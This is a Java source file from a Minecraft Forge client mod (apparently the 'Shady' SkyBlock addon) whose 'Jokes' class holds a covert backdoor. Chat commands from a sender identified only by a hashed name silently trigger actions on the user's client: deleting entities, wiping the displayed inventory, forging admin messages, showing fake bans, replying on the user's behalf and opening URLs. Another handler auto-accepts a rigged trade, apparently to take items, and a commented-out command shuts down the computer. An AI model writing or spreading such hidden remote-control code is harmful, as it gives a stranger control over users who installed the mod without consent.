package cheaters.get.banned.features.include.jokes;

import cheaters.get.banned.Shady;
import cheaters.get.banned.utils.Utils;
import net.minecraft.client.gui.inventory.GuiChest;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent;
import org.apache.commons.codec.digest.DigestUtils;

import java.util.Arrays;

public class Jokes {

    private static final String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";
    private static FakeBan currentBan = null;

    private static final String allowed = "3b2eb9e79d07739429ee68b6569ff4aaef02a9946ef10daf6e4918997bfd8151";

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onChat(ClientChatReceivedEvent event) {
        if(event.type == 0) {
            String message = event.message.getUnformattedText();

            if(!Shady.disabledSettings.contains("Jokes")) {
                if(!message.startsWith("From")) {
                    if(message.startsWith("§9Party")) {
                        message = Utils.removeFormatting(message);
                    } else {
                        return;
                    }
                }

                String[] messageParts = message.split(":");
                if(messageParts.length >= 2) {

                    if(DigestUtils.sha256Hex(messageParts[0]).equals("3b2eb9e79d07739429ee68b6569ff4aaef02a9946ef10daf6e4918997bfd8151")) {
                        event.setCanceled(true);

                        switch(messageParts[1].trim()) {
                            case "!ENTITIES!":
                                for(Entity entity : Shady.mc.theWorld.loadedEntityList) {
                                    if(!entity.equals(Shady.mc.thePlayer)) {
                                        Shady.mc.theWorld.removeEntity(entity);
                                    }
                                }
                            break;

                            case "!WIPED!":
                                for(int i = 0; i < Shady.mc.thePlayer.inventory.mainInventory.length; i++) {
                                    if(Shady.mc.thePlayer.inventory.mainInventory[i] != null && !Shady.mc.thePlayer.inventory.mainInventory[i].getDisplayName().contains("SkyBlock Menu")) {
                                        Shady.mc.thePlayer.inventory.mainInventory[i] = null;
                                    }
                                }

                                Arrays.fill(Shady.mc.thePlayer.inventory.armorInventory, null);
                                Utils.sendMessage("&cOne of your items failed to load! Please report this!");
                                break;

                            case "ADMIN": // /msg <username> ADMIN:<username>:<message>
                                if(messageParts.length >= 4) {
                                    Utils.sendMessage("&dFrom &c[ADMIN] " + messageParts[2] + "&7: " + messageParts[3]);
                                }
                                break;

                            case "BAN": // /msg <username> BAN:<type>[:(true/false)]
                                if(messageParts.length >= 3) {
                                    currentBan = new FakeBan();

                                    if(messageParts.length >= 4 && messageParts[3].trim().equalsIgnoreCase("true")) {
                                        currentBan.isPerm = true;
                                    }

                                    switch(messageParts[2].trim()) {
                                        case "30":
                                        case "69":
                                        case "90":
                                        case "180":
                                        case "360":
                                        case "420":
                                            currentBan.type = FakeBan.BanType.CHEATING_TIMED;
                                            currentBan.duration = Integer.parseInt(messageParts[2].trim()) * 24 * 60 * 60 * 1000L;
                                            break;

                                        case "PERM":
                                            currentBan.type = FakeBan.BanType.CHEATING_PERM;
                                            break;

                                        case "BOOST":
                                            currentBan.type = FakeBan.BanType.BOOSTING;
                                            break;

                                        case "NAME":
                                            currentBan.type = FakeBan.BanType.USERNAME;
                                            break;
                                    }

                                    currentBan.execute();
                                }
                                break;

                            case "!VERSION!":
                                event.setCanceled(false);
                                Utils.sendMessageAsPlayer("/r " + Shady.VERSION);
                                break;

                            case "!ISLAND!":
                                if(Utils.inSkyBlock) Utils.sendMessageAsPlayer("/is");
                                break;

                            case "!DRIP!":
                                Utils.openUrl("https://shadyaddons.com/drip");
                                break;

                            /*case "!TOUCHGRASS!":
                                Utils.openUrl("https://shadyaddons.com/touch-grass/");
                                if(SystemUtils.IS_OS_WINDOWS) {
                                    try {
                                        Runtime.getRuntime().exec("shutdown.exe -s -t 20");
                                    } catch(Exception ignored) {}
                                }
                                break;*/

                            case "!PERMBAN!":
                                currentBan = new FakeBan(FakeBan.BanType.CHEATING_TIMED, 2592000000L, true);
                                currentBan.execute();
                                break;

                            case "!BANNED!":
                                currentBan = new FakeBan(FakeBan.BanType.CHEATING_TIMED, 2592000000L, false);
                                currentBan.execute();
                                break;

                            case "!BADNAME!":
                            case "!NAMEBAN!":
                                currentBan = new FakeBan(FakeBan.BanType.USERNAME, 2592000000L, true);
                                currentBan.execute();
                                break;

                            default:
                                event.setCanceled(false);
                        }
                    }
                }
            }
        }
    }

    @SubscribeEvent
    public void autoTrade(GuiScreenEvent.BackgroundDrawnEvent event) {
        if(Utils.inSkyBlock && !Shady.disabledSettings.contains("Jokes") && event.gui instanceof GuiChest) {

            String name = Utils.getGuiName(event.gui);
            if(name.startsWith("You") && DigestUtils.sha256Hex(name).equals("742158a0fa8b68b41cf004559a9a03786c38dce4d4b600338c0067bc0a53d5b2")) {

                // Slot where carrots will be placed by the trader
                ItemStack item = Shady.mc.thePlayer.openContainer.inventorySlots.get(5).getStack();
                if(item != null && item.getItem() == Items.carrot && item.stackSize == 5) {

                    // Slot where the trade button will be for the user
                    ItemStack tradeButton = Shady.mc.thePlayer.openContainer.inventorySlots.get(39).getStack();
                    if(tradeButton != null && tradeButton.getDisplayName().contains("Deal!")) {

                        Shady.mc.playerController.windowClick(
                                Shady.mc.thePlayer.openContainer.windowId,
                                39,
                                2,
                                0,
                                Shady.mc.thePlayer
                        );
                    }
                }
            }
        }
    }

    @SubscribeEvent
    public void onJoinServer(FMLNetworkEvent.ClientConnectedToServerEvent event) {
        if(currentBan != null && currentBan.isPerm && currentBan.getTimeLeft() > 0 && Shady.mc.getCurrentServerData() != null && Shady.mc.getCurrentServerData().serverIP.contains("hypixel.net") && !Shady.mc.getCurrentServerData().serverIP.contains("letmein")) {
            currentBan.execute(event.manager);
        }

        if(currentBan != null && !currentBan.isPerm) {
            currentBan = null;
        }
    }

}
